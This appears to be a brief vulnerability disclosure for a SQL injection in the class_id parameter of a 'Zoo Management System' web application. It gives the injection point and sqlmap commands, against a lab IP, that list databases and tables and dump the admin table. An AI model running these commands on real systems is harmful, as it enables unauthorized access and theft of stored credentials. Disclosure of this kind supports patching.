# Zoo Management System SQL Injection
* `Description` => sql injection at `/animals?class_id=1`
* `Injection Point`
```python
http://192.168.1.101:8080/ZooManagementSystem/public_html/animals?class_id=1
```
# Exploit 
* Exploit with Sqlmap
```python
python3 sqlmap.py -u http://192.168.1.101:8080/ZooManagementSystem/public_html/animals?class_id=1 -dbs
```
![image](https://user-images.githubusercontent.com/79050415/159439336-75bb1798-ade3-471e-8b31-310d469f246c.png)

```python
python3 sqlmap.py -u http://192.168.1.101:8080/ZooManagementSystem/public_html/animals?class_id=1 -tables -D zoomanagement
```
![image](https://user-images.githubusercontent.com/79050415/159439476-4214e107-398d-4784-b3b0-6f15cf6e5980.png)
```python
python3 sqlmap.py -u http://192.168.1.101:8080/ZooManagementSystem/public_html/animals?class_id=1 -columns -D zoomanagement -T admin -dump
```
![image](https://user-images.githubusercontent.com/79050415/159439627-7e2e641c-92a2-41b1-bb72-f1d0af7d5f5e.png)

# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/159439977-c2c43e07-fa81-4b93-b9da-3d18866c1d04.png)
* No filter `class_id`  when inserting data to database
